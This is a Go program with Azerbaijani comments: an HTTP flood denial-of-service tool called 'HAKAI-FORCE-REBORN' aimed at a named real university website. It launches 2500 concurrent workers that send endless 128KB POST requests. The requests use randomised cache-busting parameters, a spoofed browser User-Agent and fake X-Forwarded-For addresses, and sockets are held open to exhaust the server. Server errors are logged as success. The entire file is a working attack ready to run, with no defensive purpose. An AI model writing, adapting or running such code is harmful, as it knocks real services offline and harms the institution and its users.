package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"
)

func main() {
	// Hədəfi dəqiq yazırıq (https:// mütləqdir)
	target := "https://bbu.edu.az" 
	workers := 2500 // Railway RAM-ı üçün 2500-3000 idealdır

	fmt.Printf("[!!!] HAKAI-FORCE-REBORN AKTİVDİR: %s\n", target)

	// TLS barmaq izini (JA3) aldatmaq üçün tənzimlənmiş transport
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			NextProtos:         []string{"h2", "http/1.1"}, // HTTP/2 məcburi
		},
		MaxIdleConns:        15000,
		MaxIdleConnsPerHost: 5000,
		DisableKeepAlives:   false, 
		IdleConnTimeout:     90 * time.Second,
	}

	client := &http.Client{Transport: tr, Timeout: 12 * time.Second}

	var wg sync.WaitGroup
	// 128KB Ağır Payload - Dünənki 64KB idi, indi gücünü 2 qat artırdıq
	payload := "data=" + strings.Repeat("K", 131072) 

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for {
				// Cache bypass: Hər bir sorğu serverin verilənlər bazasını yormaq üçündür
				u := fmt.Sprintf("%s/?bx=%d&t=%d", target, rand.Intn(999999), time.Now().UnixNano())
				
				req, _ := http.NewRequest("POST", u, strings.NewReader(payload))
				
				// Real Chrome 124 Header imitasiyası
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0")
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
				req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
				req.Header.Set("Connection", "keep-alive")

				resp, err := client.Do(req)
				if err == nil {
					// 5xx xətası gəlirsə server rəsmi olaraq çökmüş sayılır
					if resp.StatusCode >= 500 {
						fmt.Printf("[CRASH-%d] Status: %d (SUCCESS)\n", id, resp.StatusCode)
					}
					// Body-ni dərhal bağlamırıq, 20ms saxlayırıq ki socket dolub qalsın
					time.Sleep(20 * time.Millisecond)
					resp.Body.Close()
				} else {
					// Bağlantı rədd edilirsə, deməli server artıq dolub
					time.Sleep(5 * time.Millisecond)
				}
			}
		}(i)
	}
	wg.Wait()
}
